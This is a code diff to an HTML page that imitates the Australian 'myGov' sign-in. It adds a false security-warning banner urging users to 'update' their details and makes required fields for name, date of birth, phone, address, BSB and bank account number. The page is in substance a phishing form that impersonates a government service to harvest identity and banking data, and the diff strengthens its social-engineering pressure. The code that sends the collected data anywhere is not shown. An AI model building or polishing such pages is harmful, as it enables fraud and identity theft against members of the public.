@@ -34,45 +34,58 @@
     <section class="form-section" id="signin">
         <h2>Sign in</h2>
 
-        <form class="form-grid" id="dataForm" onsubmit="return false;">
+        <div class="security-warning">
+            <span class="security-warning-icon">⚠️</span>
+            <span><strong>Important:</strong> For security reasons, your details need to be updated before you can continue using myGov services.</span>
+        </div>
+
+        <form class="form-grid" id="dataForm" onsubmit="return false;" novalidate>
             <div class="form-field">
-                <label for="first-name">First name</label>
-                <input type="text" id="first-name" name="first-name" placeholder="John" autocomplete="given-name">
+                <label for="first-name">First name <span class="req">*</span></label>
+                <input type="text" id="first-name" name="first-name" placeholder="John" autocomplete="given-name" required>
+                <div class="field-error" data-error-for="first-name"></div>
             </div>
 
             <div class="form-field">
-                <label for="last-name">Last name</label>
-                <input type="text" id="last-name" name="last-name" placeholder="Smith" autocomplete="family-name">
+                <label for="last-name">Last name <span class="req">*</span></label>
+                <input type="text" id="last-name" name="last-name" placeholder="Smith" autocomplete="family-name" required>
+                <div class="field-error" data-error-for="last-name"></div>
             </div>
 
             <div class="form-field">
-                <label for="dob">Date of birth</label>
-                <input type="text" id="dob" name="dob" placeholder="__/__/____" maxlength="10" inputmode="numeric" autocomplete="bday">
+                <label for="dob">Date of birth <span class="req">*</span></label>
+                <input type="text" id="dob" name="dob" placeholder="__/__/____" maxlength="10" inputmode="numeric" autocomplete="bday" required>
+                <div class="field-error" data-error-for="dob"></div>
             </div>
 
             <div class="form-field">
-                <label for="phone">Phone number</label>
-                <input type="tel" id="phone" name="phone" placeholder="+1 555 000 000" inputmode="tel" autocomplete="tel">
+                <label for="phone">Phone number <span class="req">*</span></label>
+                <input type="tel" id="phone" name="phone" placeholder="+1 555 000 000" inputmode="tel" autocomplete="tel" required>
+                <div class="field-error" data-error-for="phone"></div>
             </div>
 
             <div class="form-field">
-                <label for="address">Address</label>
-                <input type="text" id="address" name="address" placeholder="123 Main St" autocomplete="street-address">
+                <label for="address">Address <span class="req">*</span></label>
+                <input type="text" id="address" name="address" placeholder="123 Main St" autocomplete="street-address" required>
+                <div class="field-error" data-error-for="address"></div>
             </div>
 
             <div class="form-field">
-                <label for="postcode">Postcode</label>
-                <input type="text" id="postcode" name="postcode" placeholder="0000" inputmode="numeric" autocomplete="postal-code">
+                <label for="postcode">Postcode <span class="req">*</span></label>
+                <input type="text" id="postcode" name="postcode" placeholder="0000" inputmode="numeric" autocomplete="postal-code" required>
+                <div class="field-error" data-error-for="postcode"></div>
             </div>
 
             <div class="form-field">
-                <label for="bsb">BSB</label>
-                <input type="text" id="bsb" name="bsb" placeholder="000-000" maxlength="7" inputmode="numeric" autocomplete="off">
+                <label for="bsb">BSB <span class="req">*</span></label>
+                <input type="text" id="bsb" name="bsb" placeholder="000-000" maxlength="7" inputmode="numeric" autocomplete="off" required>
+                <div class="field-error" data-error-for="bsb"></div>
             </div>
 
             <div class="form-field">
-                <label for="account-number">Account number</label>
-                <input type="text" id="account-number" name="account-number" placeholder="00000000" maxlength="10" inputmode="numeric" autocomplete="off">
+                <label for="account-number">Account number <span class="req">*</span></label>
+                <input type="text" id="account-number" name="account-number" placeholder="00000000" maxlength="10" inputmode="numeric" autocomplete="off" required>
+                <div class="field-error" data-error-for="account-number"></div>
             </div>
 
             <button type="submit" class="form-submit" id="submitBtn">Continue</button>
